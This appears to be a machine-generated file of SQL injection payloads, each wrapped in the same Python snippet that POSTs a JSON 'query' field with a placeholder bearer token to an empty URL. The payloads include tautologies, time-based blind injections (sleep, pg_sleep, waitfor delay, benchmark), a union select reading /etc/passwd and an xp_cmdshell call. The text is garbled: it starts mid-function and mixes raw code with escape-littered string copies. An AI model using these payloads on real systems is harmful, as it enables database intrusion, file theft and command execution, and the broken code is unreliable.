                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or sleep\x28__TIME__\x29=\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'whatever' in ('whatever')\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22; begin declare @var varchar(8000) set @var=' ...\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22union select 1,load_file('/etc/passwd'),1,1,1;\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x220x77616974666F722064656C61792027303A303A313027 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22exec\x28\x40s\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22union select\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or sleep\x28__TIME__\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select * from information_schema.tables--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22a' or 1=1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22a' or 'a' = 'a\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar\x2822\x29 select \x40s =\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 2 between 1 and 3\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or a=a--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or '1'='1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22|\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or sleep(__TIME__)='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 1 --'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 #\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22having\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22a'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or isNULL\x281/0\x29 /*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar \x288000\x29 select \x40s = 0x73656c ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22â\x80\x98 or 1=1 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22char%4039%41%2b%40SELECT\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22order by\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22bfilename\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22having 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or username like char\x2837\x29;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22;waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' AND userid IS NULL; --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22*/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'text' > 't'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x28select top 1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22\x22);waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22a' or 3=3--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22-- &password=\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22group by userid having 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or ''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22; exec master..xp_cmdshell\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%20or%20x=x\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29\x29 or sleep\x28__TIME__\x29=\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x220x730065006c0065006300740020004000400076006500 ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22hi' or 1=1 --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22%20or%20'x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or 'something' = 'some'+'thing'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22exec sp\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x2229 %\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x28\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22Ã½ or 1=1 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x220 or 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29 or \x28a=a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22uni/**/on sel/**/ect\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22replace\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
